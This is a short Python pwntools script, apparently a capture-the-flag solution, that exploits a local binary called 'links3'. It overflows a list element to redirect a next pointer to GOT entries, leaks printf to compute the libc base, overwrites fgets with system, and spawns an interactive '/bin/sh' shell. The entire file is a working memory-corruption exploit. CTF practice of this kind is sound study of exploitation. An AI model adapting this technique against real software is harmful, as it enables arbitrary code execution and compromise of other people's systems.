from pwn import *

elf = context.binary = ELF('links3',checksec=False)
libc = elf.libc
p = elf.process()

def write(index,value):
	p.sendlineafter('>>>','2')
	p.sendlineafter('>>>',index)
	p.sendlineafter('>>>',value)


### create few allocations
log.info('creating 3 allocations')
write('0','/bin/sh\x00')
write('1','B'*8)
write('2','C'*8)

#### write next of 1st element with printf
log.info("Overwritting 2nd element's next pointer with printf got address")
payload = b'C'*64
payload += p64(elf.got['printf'])
write('1',payload)

# leak 
log.info('leaking plt address of printf')
p.sendlineafter('>>>','1')
leak = p.recvuntil('\x7f').split()[-1]+b'\x00\x00'
leak = u64(leak)
libc_base = leak - libc.sym['printf']
log.success(f'printf leak: {hex(leak)}')
log.info('calculating libc base')
log.success(f'libc base: {hex(libc_base)}')

# overwtite 1st element's next with fgets
log.info("Overwritting 2nd element's next pointer with fgets got address")
payload = b'C'*64
payload += p64(elf.got['fgets'])
write('1',payload)

# ovwrite fgets got with system
log.info("Now 2nd element's next points to fgets got")
log.info("If we try to edit the 3rd element then we can modify fgets address")
log.info("Overwritting fgets with system ")
system = libc_base + libc.sym['system']
write('2',p64(system))

# trigger system with 0th index
# now it executes system('/bin/sh') -> coz we wrote /bin/sh in 0th index
log.info("1st element has '/bin/sh' string")
log.info("Triggering system('/bin/sh') by calling fgets with 1st element")
p.sendlineafter('>>>','2')
p.sendlineafter('>>>','0')
p.interactive()